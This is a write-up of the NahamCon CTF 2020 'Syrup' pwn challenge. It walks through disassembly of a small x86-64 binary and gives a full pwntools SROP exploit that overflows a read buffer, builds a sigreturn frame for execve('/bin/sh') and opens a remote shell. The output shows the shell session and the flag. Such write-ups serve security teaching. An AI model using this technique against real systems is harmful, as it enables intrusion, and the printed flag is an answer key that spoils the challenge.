# NahamCon CTF 2020

## Syrup

> 100
>
> Can you pwn me? 
>
> Connect here:</br>
> `nc jh2i.com 50036`</br>
>
> [`syrup`](syrup)

Tags: _pwn_ _x86-64_ _srop_ _bof_ _syscall_ _remote-shell_


## Summary

The title _Syrup_ is a pretty strong hint that this is an SROP challenge (that completely escaped me).


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

No mitigations in place.  However, with no libc and a small statically linked assembly binary, there's not a lot to work with ROP-wise.

    
### <strike>Decompile</strike> Disassemble with Ghidra 

There are four functions of interest:

```
                     entry
00401082 55              PUSH       RBP
00401083 48 89 e5        MOV        RBP,RSP
00401086 b8 01 00        MOV        EAX,0x1
         00 00
0040108b bf 01 00        MOV        EDI,0x1
         00 00
00401090 48 be 00        MOV        RSI=>msg,msg = "Can you pwn me?\n"
         20 40 00
         00 00 00 00
0040109a ba 11 00        MOV        EDX,0x11
         00 00
0040109f 0f 05           SYSCALL
004010a1 e8 9c ff        CALL       fn1
         ff ff
004010a6 e9 68 ff        JMP        nope
         ff ff
```

`entry` just prints `Can you pwn me?` using the `write` system call, then calls `fn1` before jumping to `nope`.

```
                     nope
00401013 b8 01 00        MOV        EAX,0x1
         00 00
00401018 bf 01 00        MOV        EDI,0x1
         00 00
0040101d 48 be 11        MOV        RSI,fail = "Nope.\n"
         20 40 00
         00 00 00 00
00401027 ba 07 00        MOV        EDX,0x7
         00 00
0040102c 0f 05           SYSCALL
0040102e b8 3c 00        MOV        EAX,0x3c
         00 00
00401033 bf 00 00        MOV        EDI,0x0
         00 00
00401038 0f 05           SYSCALL
0040103a 2f              ??         2Fh    /
0040103b 62              ??         62h    b
0040103c 69              ??         69h    i
0040103d 6e              ??         6Eh    n
0040103e 2f              ??         2Fh    /
0040103f 73              ??         73h    s
00401040 68              ??         68h    h
00401041 00              ??         00h
```

`nope` just emits `Nope` and then exits using the `exit` syscall.

However, there's the string `/bin/sh\x00`.  Probably something we'll need.

```
                     fn1
00401042 55              PUSH       RBP
00401043 48 89 e5        MOV        RBP,RSP
00401046 b8 ad de        MOV        EAX,0xdead
         00 00
0040104b 48 35 ef        XOR        RAX,0xbeef
         be 00 00
00401051 50              PUSH       RAX
00401052 48 83 ed 08     SUB        RBP,0x8
00401056 48 81 ed        SUB        RBP,0x400
         00 04 00 00
0040105d b8 00 00        MOV        EAX,0x0
         00 00
00401062 bf 00 00        MOV        EDI,0x0
         00 00
00401067 48 89 ee        MOV        RSI,RBP
0040106a ba 00 08        MOV        EDX,0x800
         00 00
0040106f 0f 05           SYSCALL
00401071 58              POP        RAX
00401072 48 35 ef        XOR        RAX,0xbeef
         be 00 00
00401078 48 3d ad        CMP        RAX,0xdead
         de 00 00
0040107e 75 93           JNZ        nope
00401080 5d              POP        RBP
00401081 c3              RET
```

`fn1` puts `0xdead ^ 0xbeef` on the stack, allocates `0x400` bytes, then calls `read` to _read_ in up to `0x800` bytes from `stdin`.  This is the vulnerability.  However there's the "canary" check, and if that fails, then `nope`.  Otherwise it returns to `entry` and jumps to `nope`.

Clearly we have to take control of RIP with this buffer overflow.

```
                     fn2
00401000 55              PUSH       RBP
00401001 48 89 e5        MOV        RBP,RSP
00401004 58              POP        RAX
00401005 48 bf 11        MOV        RDI,fail = "Nope.\n"
         20 40 00
         00 00 00 00
0040100f 0f 05           SYSCALL
00401011 5d              POP        RBP
00401012 c3              RET
```

`fn2` has no purpose other than to help us out.  It'll pop RAX and `syscall`.  With ROP, setting RAX and _returning_ to `POP RAX` to then get any syscall we want is easy enough, however, the challenge is setting all the other registers.

[Sigreturn Oriented Programming (SROP)](https://docs.pwntools.com/en/stable/rop/srop.html) solves that problem.

> _**sigreturn**() exists only to allow the implementation of signal handlers.  It should **never** be called directly. -- man 2 sigreturn_

lol


## Exploit

```
#!/usr/bin/python3

from pwn import *

binary = ELF('./syrup')
context.update(arch='amd64',os='linux')

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = next(binary.search(b'/bin/sh'))
frame.rsi = 0
frame.rdx = 0
frame.rip = next(binary.search(asm('syscall')))

payload  = 0x400 * b'A'
payload += p64(0xdead ^ 0xbeef)
```

Setup the stack frame to call `execve("/bin/sh",null,null)`.  The `0x400` + the "canary" payload gets to the saved base pointer.

There are at least two options (_clever_ and _not to clever_) to call `sigreturn`.

Clever:

```
payload += p64(constants.SYS_rt_sigreturn)
payload += p64(binary.symbols['fn2'])
```

The clever way puts the `rt_sigreturn` syscall number in RBP.  Then overwrites the return address with the address of `fn2`.  `fn1` before `ret` will pop RBP, then `fn2` will push RDB, then pop RAX before the `syscall`.

> They really thought of everything. 

Not so clever:

```
payload += p64(0x0)
payload += p64(0x00401004) # pop rax
payload += p64(constants.SYS_rt_sigreturn)
```

The other option is to just write anything to the saved base pointer in the stack, and then have the return address be the address of the `POP RAX` from `fn2`, then the syscall number.

In either case the generated stack frame needs to follow the overwritten return address:

```
payload += bytes(frame)
```

Finally:

```
#p = process(binary.path)
p = remote('jh2i.com', 50036)

p.recvuntil('Can you pwn me?')
p.sendline(payload)
p.interactive()
```

Just send it and get a shell.

Output:

```bash
# ./exploit.py
[*] '/pwd/datajerk/nahamconctf2020/syrup/syrup'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Opening connection to jh2i.com on port 50036: Done
[*] Switching to interactive mode

\x00$ id
uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
$ ls
flag.txt
syrup
$ cat flag.txt
flag{Sr0ppin_t0_v1ct0Ry}
```

